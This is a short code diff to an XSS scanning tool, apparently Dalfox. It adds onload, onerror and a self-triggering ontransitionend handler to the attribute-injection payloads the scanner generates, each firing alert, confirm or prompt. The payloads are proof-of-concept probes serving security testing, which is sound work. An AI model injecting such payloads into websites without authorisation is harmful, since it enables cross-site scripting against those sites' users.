@@ -367,6 +367,8 @@ func getAttrPayload(ip string) []string {
 		"onmouseleave=confirm(DALFOX_ALERT_VALUE) class=dalfox ",
 	}
 	majorHandler := []string{
+		"onload",
+		"onerror",
 		"onmouseover",
 		"onmouseenter",
 		"onmouseleave",
@@ -382,8 +384,12 @@ func getAttrPayload(ip string) []string {
 		"ontouchstart",
 		"ontouchend",
 		"ontouchmove",
+		"ontransitionend",
 	}
 	for _, mh := range majorHandler {
+		if mh == "ontransitionend" {
+			mh = "id=x tabindex=1 style=\"display:block;transition:outline 1s;\" ontransitionend"
+		}
 		payload = append(payload, mh+"=alert(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=confirm(DALFOX_ALERT_VALUE) class=dalfox ")
 		payload = append(payload, mh+"=prompt(DALFOX_ALERT_VALUE) class=dalfox ")
